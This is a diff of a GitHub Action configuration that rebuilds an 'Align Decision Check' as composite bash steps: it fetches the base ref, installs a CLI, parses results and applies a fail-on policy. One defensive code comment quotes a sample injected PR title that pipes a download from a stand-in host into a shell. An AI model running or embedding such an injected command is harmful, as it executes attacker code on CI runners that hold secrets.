@@ -1,34 +1,251 @@
 name: 'Align Decision Check'
-description: 'Check PR alignment against your team decisions tracked in Align'
+description: 'Check a pull request against your team decision graph. Works with Align cloud or a self-hosted gateway.'
+author: 'Align'
+
 branding:
-  icon: 'check-circle'
-  color: 'blue'
+  icon: 'git-merge'
+  color: 'purple'
+
 inputs:
-  align-api-key:
-    description: 'Align API key for authentication'
-    required: true
-  align-tenant-id:
-    description: 'Align tenant ID'
-    required: true
-  align-api-url:
-    description: 'Align API URL'
+  token:
+    description: 'Align API token. Store it as a secret and pass it here. Not required when pointing at a gateway that does not authenticate (e.g. a local dev stack).'
     required: false
-    default: 'https://api.align.tech'
+  tenant-id:
+    description: 'Align tenant id. Optional when the token already identifies the tenant.'
+    required: false
+  gateway-url:
+    description: 'Base URL of your Align gateway. Set this to self-host (e.g. https://align.internal.example.com). Leave unset to use Align cloud.'
+    required: false
+  env:
+    description: 'Align cloud environment when gateway-url is not set: prod, preview or local.'
+    required: false
+    default: 'prod'
+  base-ref:
+    description: 'Ref to diff against. Defaults to the pull request base branch, or the repository default branch on a push.'
+    required: false
   fail-on:
-    description: 'When to fail: "critical" (default), "any", or "none"'
+    description: 'When to fail the job: conflict (default), conflict-or-unknown, or never. "unknown" means the check could not run - failing on it is the strict choice and will block on an outage.'
     required: false
-    default: 'critical'
-  github-token:
-    description: 'GitHub token for creating check runs'
+    default: 'conflict'
+  cli-version:
+    description: 'Version of @aligndottech/cli to run. Defaults to latest because --base (which this action requires) ships in the first release after 0.8.1; pin it to an exact version once that release is out, and for reproducible builds generally.'
     required: false
-    default: ${{ github.token }}
+    default: 'latest'
+  working-directory:
+    description: 'Directory to run in.'
+    required: false
+    default: '.'
+
 outputs:
   status:
-    description: 'Alignment status: aligned, conflicting, no-context, or unknown (the check could not run - never treat as a pass)'
-  conflicts-count:
-    description: 'Number of conflicts found'
-  critical-count:
-    description: 'Number of critical conflicts'
+    description: 'aligned, conflicting, unknown or error.'
+    value: ${{ steps.check.outputs.status }}
+  result:
+    description: 'The full JSON result from the check.'
+    value: ${{ steps.check.outputs.result }}
+
 runs:
-  using: 'node20'
-  main: 'dist/index.cjs'
+  using: 'composite'
+  steps:
+    # actions/checkout defaults to a shallow clone with a single commit, so the merge base
+    # with the target branch is not present and `git diff base...HEAD` fails. Rather than
+    # make every caller remember `fetch-depth: 0`, fetch what we need here.
+    - name: Ensure the base ref is available
+      id: base
+      shell: bash
+      working-directory: ${{ inputs.working-directory }}
+      env:
+        # Through `env` for the same reason as PR_TITLE below: templated into the script, a
+        # `${{ github.event.* }}` value is substituted before bash parses it. This one needs
+        # repo-admin access to set rather than merely opening a PR, so the threat model is
+        # much smaller - but git ref names permit `;`, backticks and `$`, so the shape is
+        # identical and the guard that found it has no exemption list on purpose.
+        DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
+      run: |
+        set -euo pipefail
+
+        BASE="${{ inputs.base-ref }}"
+        if [ -z "$BASE" ]; then
+          if [ -n "${GITHUB_BASE_REF:-}" ]; then
+            BASE="$GITHUB_BASE_REF"                      # pull_request: the target branch
+          else
+            BASE="${DEFAULT_BRANCH:-}"
+          fi
+        fi
+
+        # Accept either a bare branch name or an already-qualified ref.
+        case "$BASE" in
+          origin/*|refs/*) REMOTE_REF="$BASE" ;;
+          *) REMOTE_REF="origin/$BASE" ;;
+        esac
+
+        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
+          git fetch --unshallow --no-tags origin "+refs/heads/${BASE#origin/}:refs/remotes/origin/${BASE#origin/}" \
+            || git fetch --deepen=200 --no-tags origin "${BASE#origin/}" || true
+        else
+          git fetch --no-tags origin "+refs/heads/${BASE#origin/}:refs/remotes/origin/${BASE#origin/}" || true
+        fi
+
+        # Fail loudly rather than letting an unresolvable base become an empty diff and a
+        # green tick. A gate that cannot see the change must not report success.
+        if ! git rev-parse --verify --quiet "$REMOTE_REF" >/dev/null; then
+          echo "::error::Could not resolve base ref '$REMOTE_REF'. Pass base-ref, or use actions/checkout with fetch-depth: 0."
+          exit 1
+        fi
+        if ! git merge-base "$REMOTE_REF" HEAD >/dev/null 2>&1; then
+          echo "::error::No merge base between '$REMOTE_REF' and HEAD - the clone is too shallow. Use actions/checkout with fetch-depth: 0."
+          exit 1
+        fi
+
+        echo "ref=$REMOTE_REF" >> "$GITHUB_OUTPUT"
+
+    - name: Run the alignment check
+      id: check
+      shell: bash
+      working-directory: ${{ inputs.working-directory }}
+      env:
+        ALIGN_TOKEN: ${{ inputs.token }}
+        ALIGN_TENANT_ID: ${{ inputs.tenant-id }}
+        ALIGN_GATEWAY_URL: ${{ inputs.gateway-url }}
+        ALIGN_ENV: ${{ inputs.env }}
+        # Through `env`, never interpolated into the script below. A PR title is written by
+        # whoever opened the PR, so `${{ github.event.pull_request.title }}` inside a run block
+        # is a script-injection hole: a PR titled `"; curl evil.sh | sh; #` would execute on the
+        # runner with the token in scope. An env value is passed to the shell as data.
+        # Empty on any non-PR trigger (workflow_dispatch, push), which the guard below handles.
+        PR_TITLE: ${{ github.event.pull_request.title }}
+      run: |
+        set -uo pipefail
+
+        # Positional args rather than an array: `"${ARR[@]}"` on an EMPTY array errors under
+        # `set -u` in bash 3.2, which is what macOS runners ship. `"$@"` is safe when empty.
+        set -- --ci --base "${{ steps.base.outputs.ref }}"
+        if [ -n "${PR_TITLE:-}" ]; then
+          set -- "$@" --title "$PR_TITLE"
+        fi
+
+        # Installed rather than npx'd so the optional dependency can be pruned.
+        # `@huggingface/transformers` (359MB with onnxruntime) backs `--local` mode only,
+        # and CI always talks to a gateway, so it is downloaded and never loaded. Measured
+        # on 0.17.1, cold cache: 431MB in 25s with it, 45MB in 5s without, and a pruned
+        # install completes a real gateway check unchanged. It is also the dependency most
+        # likely to fail to install at all, which used to take local mode down with it.
+        #
+        # A --prefix, not -g: a global install needs a writable npm prefix, which is not a
+        # given on a self-hosted runner, and this action runs on other people's machines.
+        PREFIX="${RUNNER_TEMP:-/tmp}/align-cli"
+        INSTALL_LOG="${RUNNER_TEMP:-/tmp}/align-install.log"
+        OUT=""
+
+        set +e
+        npm install --omit=optional --no-save --no-audit --no-fund \
+          --prefix "$PREFIX" "@aligndottech/cli@${{ inputs.cli-version }}" > "$INSTALL_LOG" 2>&1
+        CODE=$?
+        if [ "$CODE" -eq 0 ]; then
+          OUT="$("$PREFIX/node_modules/.bin/align" check "$@")"
+          CODE=$?
+        else
+          # Deliberately NOT a hard exit. `fail-on` owns whether a check that could not run
+          # blocks the build, and failing the step here would bypass that policy - turning
+          # an npm outage into a merge freeze for everyone using the default.
+          echo "::warning::Could not install @aligndottech/cli@${{ inputs.cli-version }} - the check did not run."
+          tail -n 5 "$INSTALL_LOG"
+        fi
+        set -e
+
+        # Exit codes are the CLI's contract: 0 aligned, 1 conflict, 2 could-not-check.
+        # `unknown` is deliberately NOT folded into either - "we found nothing" and "we
+        # could not look" call for different responses.
+        # node, not python3: the action already requires node to run the CLI, so this adds
+        # no runtime that a runner might not have.
+        STATUS="$(printf '%s' "$OUT" | tail -n 1 | node -e \
+          'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{process.stdout.write(JSON.parse(s).status||"error")}catch{process.stdout.write("error")}})' \
+          2>/dev/null || echo error)"
+
+        # The gateway explains WHY it could not check - brain_timeout, brain_error,
+        # brain_degraded, bad_base_ref - and the CLI already prints the whole result, so the
+        # reason is sitting in $OUT. Without pulling it out, a failure reads only as
+        # "status 'unknown'", and the difference between "retry, the analysis timed out" and
+        # "something is actually broken" costs an investigation every time. Empty string when
+        # absent, which is the normal case on a completed check.
+        REASON="$(printf '%s' "$OUT" | tail -n 1 | node -e \
+          'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{process.stdout.write(JSON.parse(s).reason||"")}catch{process.stdout.write("")}})' \
+          2>/dev/null || echo '')"
+
+        {
+          echo "status=$STATUS"
+          echo "reason=$REASON"
+          echo "code=$CODE"
+          echo "result<<ALIGN_EOF"
+          printf '%s\n' "$OUT"
+          echo "ALIGN_EOF"
+        } >> "$GITHUB_OUTPUT"
+
+        {
+          echo "### Align Decision Check"
+          echo ""
+          case "$STATUS" in
+            aligned)     echo "No conflicts with recorded decisions." ;;
+            conflicting) echo "**Conflicts with one or more recorded decisions.**" ;;
+            unknown)     echo "Could not complete the check. This is not a pass." ;;
+            *)           echo "The check did not run. This is not a pass." ;;
+          esac
+          echo ""
+          echo '```json'
+          printf '%s\n' "$OUT"
+          echo '```'
+        } >> "$GITHUB_STEP_SUMMARY"
+
+    # BEFORE the fail-on policy, deliberately: that step exits non-zero on a conflict, and a
+    # step after it would never run. So the annotations that explain a red gate have to be
+    # emitted while the job is still passing.
+    - name: Anchor conflicts to the files that produced them
+      shell: bash
+      env:
+        # Through env for the same reason as PR_TITLE: this payload carries decision titles
+        # and reasons straight out of the graph, which is text other people wrote. Interpolated
+        # into the script it would be substituted before bash parses it.
+        ALIGN_RESULT: ${{ steps.check.outputs.result }}
+      run: |
+        set -uo pipefail
+
+        # tail -n 1 because the CLI may print human-facing lines before its JSON, which is the
+        # same slice the status and reason parsers above take.
+        printf '%s' "${ALIGN_RESULT:-}" | tail -n 1 \
+          | node "${{ github.action_path }}/annotate.mjs"
+
+    - name: Apply the fail-on policy
+      shell: bash
+      run: |
+        set -uo pipefail
+        CODE="${{ steps.check.outputs.code }}"
+        STATUS="${{ steps.check.outputs.status }}"
+        REASON="${{ steps.check.outputs.reason }}"
+
+        # The policy lives in decide.sh so it can be tested. Classifying on the exit code
+        # alone is wrong: a CLI crash also exits 1 with no JSON, and reporting that as
+        # "found a conflict" is a fabricated finding. See src/__tests__/action-decide.test.ts.
+        set +e
+        OUTCOME="$(bash "${{ github.action_path }}/decide.sh" "$CODE" "$STATUS" "${{ inputs.fail-on }}" 2>&1)"
+        DECISION=$?
+        set -e
+        echo "$OUTCOME"
+
+        if [ "$DECISION" = "2" ]; then
+          echo "::error::$OUTCOME"
+          exit 1
+        fi
+
+        case "$OUTCOME" in
+          *reason=conflict*)   echo "::error::Align check found a conflict with a recorded decision." ;;
+          *incomplete*)
+            # The reason is the whole point of this annotation. "status 'unknown'" tells the
+            # reader nothing they can act on; "brain_timeout" says retry, "brain_error" says
+            # go and look. Suffix only when present so a reasonless unknown still reads well.
+            SUFFIX=""
+            [ -n "$REASON" ] && SUFFIX=", reason '$REASON'"
+            echo "::warning::Align check did not complete (status '$STATUS'$SUFFIX, exit $CODE). Nothing was verified."
+            ;;
+        esac
+
+        exit "$DECISION"
